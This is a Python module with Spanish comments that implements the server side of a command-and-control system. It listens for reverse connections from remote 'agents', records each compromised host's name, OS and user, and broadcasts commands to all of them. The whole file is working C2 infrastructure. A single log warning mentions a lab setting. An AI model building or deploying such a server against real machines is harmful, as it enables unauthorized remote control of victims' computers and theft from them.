"""Servidor TCP del C2: acepta conexiones inversas y administra los agentes."""
from __future__ import annotations

import asyncio
import contextlib
import hmac
import logging
import re
import time
from typing import Callable

from .agent import AgentConnection
from .protocol import encode, read_message

log = logging.getLogger("c2.manager")

HANDSHAKE_TIMEOUT = 10.0
MAX_CONNECTIONS = 200
MAX_AGENT_ID_LEN = 64
_ANSI_RE = re.compile(r"\x1b\[[0-?]*[ -/]*[@-~]|\x1b\][^\x07]*(?:\x07|\x1b\\)")
_CONTROL_RE = re.compile(r"[\x00-\x1f\x7f-\x9f]")
_AGENT_ID_UNSAFE_RE = re.compile(r"[^A-Za-z0-9._:-]+")


def _clean_text(value, max_len: int) -> str:
    text = _ANSI_RE.sub("", str(value or ""))
    text = _CONTROL_RE.sub("", text)
    return text[:max_len]


def sanitize_agent_id(value) -> str:
    text = _clean_text(value, MAX_AGENT_ID_LEN)
    text = _AGENT_ID_UNSAFE_RE.sub("_", text).strip("._:-")
    return text[:MAX_AGENT_ID_LEN] or "sin-id"


class AgentManager:
    """Registro de agentes conectados y utilidades de envio de comandos."""

    def __init__(
        self,
        bind_host: str,
        port: int,
        shared_secret: str = "",
        on_event: Callable[[str], None] | None = None,
        max_connections: int = MAX_CONNECTIONS,
    ) -> None:
        self.bind_host = bind_host
        self.port = port
        self.shared_secret = shared_secret
        self.on_event = on_event
        self.max_connections = max_connections
        self.started_at = time.monotonic()
        self.total_connections = 0
        self._active_connections = 0
        self._agents: dict[str, AgentConnection] = {}
        self._server: asyncio.Server | None = None

    @property
    def agents(self) -> list[AgentConnection]:
        return sorted(self._agents.values(), key=lambda agent: agent.connected_at)

    def find(self, token: str) -> AgentConnection | None:
        token = token.strip()
        if not token:
            return None
        exact = self._agents.get(token)
        if exact is not None:
            return exact
        if token.isdigit():
            agents = self.agents
            index = int(token)
            if 0 <= index < len(agents):
                return agents[index]
            return None
        matches = [agent for agent in self._agents.values() if agent.agent_id.startswith(token)]
        if len(matches) == 1:
            return matches[0]
        return None

    async def start(self) -> None:
        self._server = await asyncio.start_server(self._handle_connection, self.bind_host, self.port)
        self.port = self._server.sockets[0].getsockname()[1]
        log.info("escuchando en %s:%s", self.bind_host, self.port)
        self._emit(f"servidor escuchando en {self.bind_host}:{self.port}")
        if not self.shared_secret:
            log.warning("C2_SHARED_SECRET vacio: la autenticacion esta deshabilitada, cualquier agente puede registrarse")
            self._emit("[!] C2_SHARED_SECRET vacio: la autenticacion esta deshabilitada (solo para laboratorio)")

    async def stop(self) -> None:
        if self._server is not None:
            self._server.close()
        for agent in list(self._agents.values()):
            agent.fail_pending(ConnectionError("servidor detenido"))
            agent.close()
        self._agents.clear()
        if self._server is not None:
            with contextlib.suppress(Exception):
                await asyncio.wait_for(self._server.wait_closed(), timeout=3)

    async def broadcast(self, name: str, args: dict | None = None, timeout: float = 10.0):
        agents = self.agents
        responses = await asyncio.gather(
            *(agent.request(name, args, timeout) for agent in agents),
            return_exceptions=True,
        )
        return list(zip(agents, responses))

    async def _send_best_effort(
        self,
        writer: asyncio.StreamWriter,
        message: dict,
        timeout: float = 1.0,
    ) -> None:
        with contextlib.suppress(Exception):
            writer.write(encode(message))
            await asyncio.wait_for(writer.drain(), timeout=timeout)

    async def _handle_connection(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        peer = writer.get_extra_info("peername")
        peer_str = f"{peer[0]}:{peer[1]}" if peer else "desconocido"
        if self._active_connections >= self.max_connections:
            log.warning("conexion rechazada por limite desde %s", peer_str)
            self._emit(f"[!] conexion rechazada (limite alcanzado) desde {peer_str}")
            await self._send_best_effort(
                writer,
                {"type": "error", "code": "busy", "status": "error", "error": "servidor ocupado"},
            )
            with contextlib.suppress(Exception):
                writer.close()
            return
        self._active_connections += 1
        agent: AgentConnection | None = None
        try:
            hello = await asyncio.wait_for(read_message(reader), timeout=HANDSHAKE_TIMEOUT)
            if hello is None:
                return
            if hello.get("type") != "hello":
                raise ValueError(f"se esperaba 'hello', llego '{hello.get('type')}'")
            if self.shared_secret:
                provided = hello.get("secret")
                if not isinstance(provided, str) or not hmac.compare_digest(
                    provided.encode("utf-8"),
                    self.shared_secret.encode("utf-8"),
                ):
                    log.warning("conexion rechazada por secreto invalido desde %s", peer_str)
                    self._emit(f"[!] conexion rechazada (secreto invalido) desde {peer_str}")
                    await self._send_best_effort(
                        writer,
                        {"type": "error", "code": "auth", "status": "error", "error": "secreto invalido"},
                    )
                    return
            agent = AgentConnection(
                agent_id=sanitize_agent_id(hello.get("agent_id")),
                peer=peer_str,
                reader=reader,
                writer=writer,
                hostname=_clean_text(hello.get("hostname", ""), 128),
                os_info=_clean_text(hello.get("os", ""), 128),
                user=_clean_text(hello.get("user", ""), 64),
                version=_clean_text(hello.get("version", ""), 32),
            )
            previous = self._agents.pop(agent.agent_id, None)
            if previous is not None:
                previous.fail_pending(ConnectionError("reemplazado por una conexion nueva"))
                previous.close()
                self._emit(f"[!] agente reconectado: {agent.agent_id} (se reemplazo la conexion anterior)")
            else:
                self._emit(
                    f"[+] agente conectado: {agent.agent_id} "
                    f"host={agent.hostname or '?'} user={agent.user or '?'} desde {peer_str}"
                )
            self._agents[agent.agent_id] = agent
            self.total_connections += 1
            log.info("agente conectado: %s desde %s", agent.agent_id, peer_str)
            await self._read_loop(agent)
        except (asyncio.TimeoutError, ValueError) as exc:
            log.warning("handshake fallido desde %s: %s", peer_str, exc)
            self._emit(f"[!] handshake fallido desde {peer_str}: {exc}")
        except (ConnectionError, asyncio.IncompleteReadError):
            pass
        finally:
            self._active_connections -= 1
            if agent is not None and self._agents.get(agent.agent_id) is agent:
                self._agents.pop(agent.agent_id, None)
                agent.fail_pending(ConnectionError("agente desconectado"))
                self._emit(f"[-] agente desconectado: {agent.agent_id}")
                log.info("agente desconectado: %s", agent.agent_id)
            with contextlib.suppress(Exception):
                writer.close()

    async def _read_loop(self, agent: AgentConnection) -> None:
        while True:
            message = await read_message(agent.reader)
            if message is None:
                return
            agent.touch()
            message_type = message.get("type")
            if message_type in ("result", "pong"):
                if not agent.resolve(message):
                    log.info(
                        "respuesta no correlacionada de %s: id=%r type=%s",
                        agent.agent_id,
                        message.get("id"),
                        message_type,
                    )
            elif message_type != "heartbeat":
                log.info("mensaje ignorado de %s: type=%s", agent.agent_id, message_type)

    def _emit(self, text: str) -> None:
        if self.on_event is not None:
            with contextlib.suppress(Exception):
                self.on_event(text)
